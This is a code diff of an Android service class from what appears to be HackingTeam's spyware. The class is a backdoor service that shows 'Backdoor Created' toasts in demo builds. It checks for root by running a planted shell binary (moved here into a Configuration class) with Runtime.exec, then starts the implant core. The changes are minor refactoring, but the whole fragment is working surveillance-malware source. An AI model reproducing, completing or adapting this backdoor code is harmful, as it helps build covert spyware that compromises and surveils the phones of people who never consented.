@@ -24,6 +24,7 @@ import android.view.WindowManager;
 import android.widget.Toast;
 
 import com.android.service.auto.Cfg;
+import com.android.service.conf.Configuration;
 import com.android.service.file.AutoFile;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
@@ -35,7 +36,6 @@ public class ServiceCore extends Service {
 	private static final String TAG = "ServiceCore";
 
 	private Core core;
-	private String shellFile;
 
 	@Override
 	public IBinder onBind(Intent intent) {
@@ -45,13 +45,16 @@ public class ServiceCore extends Service {
 	@Override
 	public void onCreate() {
 		super.onCreate();
+		
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onCreate)");
 		}
+		
 		if (Cfg.DEMO) {
 			Toast.makeText(this, "Backdoor Created", Toast.LENGTH_LONG).show();
 			// setBackground();
 		}
+		
 		Status.setAppContext(getApplicationContext());
 	}
 
@@ -69,6 +72,7 @@ public class ServiceCore extends Service {
 			paint.setAntiAlias(true);
 			paint.setTextSize(20);
 			canvas.drawText("HackingTeam", 10, 100, paint);
+			
 			try {
 				wm.setBitmap(bitmap);
 			} catch (final IOException e) {
@@ -82,6 +86,7 @@ public class ServiceCore extends Service {
 	@Override
 	public void onDestroy() {
 		super.onDestroy();
+		
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onDestroy)");
 		}
@@ -89,6 +94,7 @@ public class ServiceCore extends Service {
 		if (Cfg.DEMO) {
 			Toast.makeText(this, "Backdoor Destroyed", Toast.LENGTH_LONG).show();
 		}
+		
 		core.Stop();
 		core = null;
 	}
@@ -96,8 +102,6 @@ public class ServiceCore extends Service {
 	@Override
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
-
-		this.shellFile = "/system/bin/ntpsvd";
 
 		if (checkRoot() == true) {
 			Status.self().setRoot(true);
@@ -117,7 +121,6 @@ public class ServiceCore extends Service {
 		// Core starts
 		core = new Core();
 		core.Start(this.getResources(), getContentResolver());
-
 	}
 
 	private boolean root() {
@@ -221,6 +224,7 @@ public class ServiceCore extends Service {
 				Check.log(e1);
 				Check.log(TAG + " (root): Exception on root()");
 			}
+			
 			return false;
 		}
 
@@ -232,9 +236,10 @@ public class ServiceCore extends Service {
 
 		try {
 			// Verifichiamo di essere root
-			final AutoFile file = new AutoFile(shellFile);
+			final AutoFile file = new AutoFile(Configuration.shellFile);
+			
 			if (file.exists() && file.canRead()) {
-				final Process p = Runtime.getRuntime().exec(shellFile + " air");
+				final Process p = Runtime.getRuntime().exec(Configuration.shellFile + " air");
 				p.waitFor();
 
 				if (p.exitValue() == 1) {
